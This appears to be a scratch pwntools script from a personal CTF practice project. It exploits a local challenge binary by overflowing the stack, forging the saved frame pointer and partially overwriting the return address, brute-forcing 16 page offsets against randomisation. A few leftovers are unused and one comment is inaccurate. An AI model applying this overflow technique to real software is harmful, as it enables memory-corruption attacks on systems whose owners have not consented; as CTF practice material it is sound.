def main():
    print("Hello from ctf-playground!")
from pwn import * 

from pwnlib import gdb
import os
# import gdb
files = os.listdir("/home/kokona/proj_lib/ctf_playground/challenge/")
file =filter(lambda x:not x.endswith((".c",".md")),files)
gdb_script = '''
printf "rsp+8(rbp): %p\\n", $rbp
printf "rip(return address): %p\\n", $rip
'''
# 2012
if __name__ == "__main__":
    url = os.path.dirname(os.path.abspath(__file__)) + "/challenge/" + next(file)    
    rbp = 2**64-1  # Example value, replace with actual rbp address
    for i in range(16): 
        p = process(url)  # SIGSTOP to pause the process

        ret_addr = 0xb8f + i * 0x1000
        num_bits = 2
        print(i)
        p.send(b"\x00"+b"A"*0x6f +rbp.to_bytes(8,"little")+ret_addr.to_bytes(2,"little"))
        print(p.recvall().decode())
# 